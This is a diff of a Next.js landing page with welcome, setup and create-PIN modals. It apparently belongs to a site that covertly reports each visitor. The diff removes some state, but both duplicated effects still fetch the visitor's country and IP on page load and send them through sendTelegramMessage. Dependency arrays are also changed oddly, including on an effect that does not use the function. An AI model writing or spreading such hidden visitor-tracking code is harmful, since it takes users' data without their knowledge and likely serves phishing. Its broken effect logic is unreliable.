@@ -2,7 +2,6 @@
 
 import Image from "next/image";
 import Link from "next/link";
-import { motion } from "framer-motion";
 import WelcomeModal from "../components/WelcomeModal";
 import AppSetupModal from "../components/AppSetupModal";
 import CreatePinModal from "../components/CreatePinModal";
@@ -16,13 +15,9 @@ export default function LandingPage() {
   const [welcomeOpen, setWelcomeOpen] = useState(false);
   const [setupOpen, setSetupOpen] = useState(false);
   const [pinOpen, setPinOpen] = useState(false);
-  const [showWelcome, setShowWelcome] = useState(true);
   const [showSelectType, setShowSelectType] = useState(false);
 
-  const [country, setCountry] = useState("");
-  const [ipAddress, setIpAddress] = useState("");
   const [browser, setBrowser] = useState<string | undefined>(undefined);
-  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
   const hasSentVisitorMessage = useRef(false);
   const pathname = usePathname();
   const getCurrentUrl = () => {
@@ -81,14 +76,12 @@ export default function LandingPage() {
     if (!hasSentVisitorMessage.current) {
       const fetchUserLocation = async () => {
         const userCountry = await getUserCountry();
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
         sendTelegramMessage(userCountry);
       };
       fetchUserLocation();
       hasSentVisitorMessage.current = true;
     }
-  }, []);
+  }, [sendTelegramMessage]);
 
  
 
@@ -97,20 +90,18 @@ export default function LandingPage() {
     if (typeof window !== "undefined") {
       setBrowser(navigator.userAgent);
     }
-  }, []);
+  }, [sendTelegramMessage]);
 
   useEffect(() => {
     if (!hasSentVisitorMessage.current) {
       const fetchUserLocation = async () => {
         const userCountry = await getUserCountry();
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
         sendTelegramMessage(userCountry);
       };
       fetchUserLocation();
       hasSentVisitorMessage.current = true;
     }
-  }, []);
+  }, [sendTelegramMessage]);
   return (
     <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
       {/* Top gradient line */}
